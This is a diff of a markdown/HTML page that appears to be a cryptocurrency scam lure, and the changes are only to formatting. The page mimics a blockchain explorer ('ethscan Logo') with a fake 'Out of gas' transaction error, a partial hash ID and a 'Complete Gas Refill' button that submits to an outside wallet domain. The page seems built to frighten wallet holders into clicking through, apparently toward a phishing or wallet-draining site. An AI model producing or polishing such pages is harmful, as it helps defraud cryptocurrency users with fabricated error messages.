@@ -38,9 +38,10 @@ Hash ID:    **8b214f6839d869d6ab80[39Kn3XYPUmrud...qHwnUYg6uvz]**
 <form action="https://phantom.com/" method="get">
 <button type="submit"> ⚙️ Complete Gas Refill </button>
 
+<br>
 
 
-* <span style="color: Yellow;"> ~~**Warning! Error encountered during contract execution [Out of gas]**~~ ⚠️ </span>
+<span style="color: Yellow;"> ~~**Warning! Error encountered during contract execution [Out of gas]**~~ ⚠️ </span>
 
 
 
@@ -49,23 +50,22 @@ Hash ID:    **8b214f6839d869d6ab80[39Kn3XYPUmrud...qHwnUYg6uvz]**
 <img src="IMG_9150.jpeg" alt="ethscan Logo" width="700" />
 
 
+<br>
+
+
+    ⛽️ Alert Error: VM Exception while processing transaction out of gas
 
 
 
-*     ⛽️ Alert Error: VM Exception while processing transaction out of gas
+<br>
 
 
 
+<span style="color: Red;">**SUMMARY**The __"out of gas"__ error occurs when all the gas you allotted for the transaction is consumed before the transaction could complete!</span>
 
 
 
-
-* <span style="color: Red;">**SUMMARY**The __"out of gas"__ error occurs when all the gas you allotted for the transaction is consumed before the transaction could complete!</span>
-
-
-
-
-
+<br>
 
 
 
